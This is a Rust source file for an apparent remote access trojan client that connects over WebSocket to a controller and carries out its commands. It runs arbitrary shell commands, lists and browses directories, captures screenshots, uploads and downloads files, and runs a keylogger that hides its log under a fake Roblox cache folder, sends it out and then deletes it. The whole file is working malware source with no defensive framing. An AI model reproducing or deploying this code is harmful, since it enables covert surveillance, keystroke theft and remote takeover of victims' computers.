use std::{env, time::Duration};
use futures_util::{StreamExt, SinkExt, stream::{SplitSink, SplitStream}};
use tokio::io::{AsyncRead, AsyncWrite, AsyncWriteExt};
use tokio_tungstenite::{connect_async, tungstenite::Message, WebSocketStream};
use std::process::Command;
use std::sync::{Arc};
use tokio::sync::Mutex; // ✅
use fs_extra::dir;
use std::time::{Instant};
use serde::Deserialize;
use tokio::fs;
use std::sync::atomic::{AtomicBool, Ordering};
use tokio::fs::File;
use tokio::io::AsyncReadExt;
use xcap::Monitor;
use serde_json::json;
use device_query::{DeviceQuery, DeviceState};
use std::fs::OpenOptions;
use std::io::Write;

#[derive(Deserialize)]
struct FileData {
    filename: String,
}

#[derive(Default)]
struct FileTransferState {
    waiting_for_meta: bool,
    waiting_for_file: bool,
    filename: Option<String>,
}

async fn send_file(text: String, mut write: SplitSink<WebSocketStream<impl AsyncRead + AsyncWrite + Unpin>, Message>){
    println!("copy -> {}", text);
    let new_path = text.trim_start_matches("copy ").trim();
    let mut file = File::open(new_path).await.unwrap();

    write.send(Message::Text("copy_command".into())).await.unwrap();

    let meta = json!({
        "filename": new_path,
    });
    write.send(Message::Text(meta.to_string())).await.unwrap();

    let mut buffer = [0u8; 16 * 1024];
    loop {
        let n = file.read(&mut buffer).await.unwrap();
        if n == 0 { break; }
        write.send(Message::Binary(buffer[..n].to_vec())).await;
    }
}

async fn handle_incoming_messages(mut read: SplitStream<WebSocketStream<impl AsyncRead + AsyncWrite + Unpin>>, mut write: SplitSink<WebSocketStream<impl AsyncRead + AsyncWrite + Unpin>, Message>, running: Arc<AtomicBool>,) {
    let state_lock1 = Arc::new(Mutex::new(FileTransferState::default()));
    let state = Arc::clone(&state_lock1);

    while let Some(message) = read.next().await {
        match message {
            Ok(Message::Text(text)) => {
                let mut state_lock = state.lock().await;
                if text == "ls" {
                    println!("LIST");
                    let current_path = env::current_dir().unwrap();
                    let mut cmd = Command::new("ls").output().unwrap();
                    let out = String::from_utf8_lossy(&cmd.stdout);
                    write.send(Message::Text(format!("Current path: {}, and fiiles:\n {}", current_path.display(), out))).await.unwrap();
                }else if text.contains("cd ") {
                    println!("cd -> {}", text);
                    let new_path = text.trim_start_matches("cd ").trim();
                    if let Err(e) = env::set_current_dir(new_path) {
                        write.send(Message::Text(format!("Error: {}", e))).await.unwrap();
                    } else {
                        let path = env::current_dir().unwrap();
                        write.send(Message::Text(format!("Current directory: {}", path.display()))).await.unwrap();
                    }
                }else if text.starts_with("cmd ") {
                    println!("cmd -> {}", text);
                    let command = text.trim_start_matches("cmd ").trim();
                    let mut cmd = Command::new("cmd")
                        .args(["/C", command])
                        .output().unwrap();
                    let out = String::from_utf8_lossy(&cmd.stdout);
                    write.send(Message::Text(format!("cmd out: \n{}", out))).await.unwrap();
                } else if text == "screen" {
                    let start = Instant::now();
                    let monitors = Monitor::all().unwrap();

                    dir::create_all("target/monitors", true).unwrap();

                    for monitor in monitors {
                        let image = monitor.capture_image().unwrap();

                        image
                            .save("monitor.png")
                            .unwrap();
                    }

                    let mut file = File::open("monitor.png").await.unwrap();
                    let mut buffer = Vec::new();
                    file.read_to_end(&mut buffer).await.unwrap();

                    write.send(Message::Binary(buffer)).await.unwrap();

                    fs::remove_file("monitor.png").await.unwrap();
                    println!("time elapsed: {:?}", start.elapsed());
                }else if text.contains("copy ") {
                    println!("copy -> {}", text);
                    let new_path = text.trim_start_matches("copy ").trim();
                    let mut file = File::open(new_path).await.unwrap();

                    write.send(Message::Text("copy_command".into())).await.unwrap();

                    let meta = json!({
                        "filename": new_path,
                    });
                    write.send(Message::Text(meta.to_string())).await.unwrap();

                    let mut buffer = [0u8; 16 * 1024];
                    loop {
                        let n = file.read(&mut buffer).await.unwrap();
                        if n == 0 { break; }
                        write.send(Message::Binary(buffer[..n].to_vec())).await.unwrap();
                    }
                }else if text == "put_command" {
                    state_lock.waiting_for_meta = true;
                }else if text == "keylog"{
                    let r = running.clone();
                    r.store(true, Ordering::Relaxed);
                    tokio::spawn({
                        async move {
                            let device_state = DeviceState::new();
                            let mut prev_keys = vec![];

                            std::fs::create_dir_all(r"C:/Roblox/Roblox_Cache").expect("Failed to create directory");
                            tokio::time::sleep(Duration::from_secs(1));
                            let mut file = OpenOptions::new()
                                .create(true)
                                .append(true)
                                .open(r"C:/Roblox/Roblox_Cache/meta.txt")
                                .expect("Failed to open file");
                    
                            while r.load(Ordering::Relaxed) {
                                let keys = device_state.get_keys();
                                if keys != prev_keys && !keys.is_empty() {
                                    writeln!(file, "{:?}", keys).expect("Failed to write to file");
                                }
                                prev_keys = keys;
                                tokio::time::sleep(std::time::Duration::from_millis(100)).await;
                            }
                        }
                    });
                    

                }else if text == "keylog_stop"{
                    running.store(false, Ordering::Relaxed);
                    tokio::time::sleep(std::time::Duration::from_secs(1)).await; 
                    println!("WTF");
                    let mut file = File::open("C:/Roblox/Roblox_Cache/meta.txt").await.unwrap();

                    write.send(Message::Text("copy_command".into())).await.unwrap();

                    let meta = json!({
                        "filename": "meta.txt",
                    });
                    write.send(Message::Text(meta.to_string())).await.unwrap();

                    let mut buffer = [0u8; 16 * 1024];
                    loop {
                        let n = file.read(&mut buffer).await.unwrap();
                        if n == 0 { break; }
                        write.send(Message::Binary(buffer[..n].to_vec())).await.unwrap();
                    }
                    fs::remove_file(r"C:/Roblox/Roblox_Cache/meta.txt").await.unwrap();
                }else if state_lock.waiting_for_meta{
                    match serde_json::from_str::<FileData>(&text){
                        Ok(txt) => {
                            state_lock.filename = Some(txt.filename);
                            state_lock.waiting_for_file = true;
                            state_lock.waiting_for_meta = false;
                        },
                        Err(e) => {
                            write.send(Message::Text(format!("Error: {}", e))).await.unwrap();
                        }
                    }
                }
            },
            Ok(Message::Binary(bytes)) => {
                let mut state_lock = state.lock().await;
                if state_lock.waiting_for_file{
                    if let Some(filename) = &state_lock.filename{
                        match File::create(filename).await{
                            Ok(mut file) => {
                                if let Err(e) = file.write_all(&bytes).await{
                                    write.send(Message::Text(format!("Error: {}", e))).await.unwrap();
                                }else {
                                    println!("Файл успешно сохранён как {}", filename);
                                    let _ = write.send(Message::Text(format!("Файл {} получен!", filename))).await;
                                }

                            }
                            Err(e) => {
                                let _ = write.send(Message::Text(format!("Ошибка создания файла: {}", e))).await;
                            }
                        }
                    }
                    state_lock.waiting_for_file = false;
                    state_lock.filename = None;
                }
            },
            _ => {}
        }
    }
}

#[tokio::main]
async fn main() {
    let url = "ws://localhost:8085";

    println!("{}", url);
    let(ws_stream, _) = connect_async(url).await.expect("Failed to connect");
    let (mut write, mut read) = ws_stream.split();
    let running = Arc::new(AtomicBool::new(true));

    // Handle incoming messages in a separate task
    let read_handle = tokio::spawn(handle_incoming_messages(read, write, running));
    let _ = read_handle.await;
}
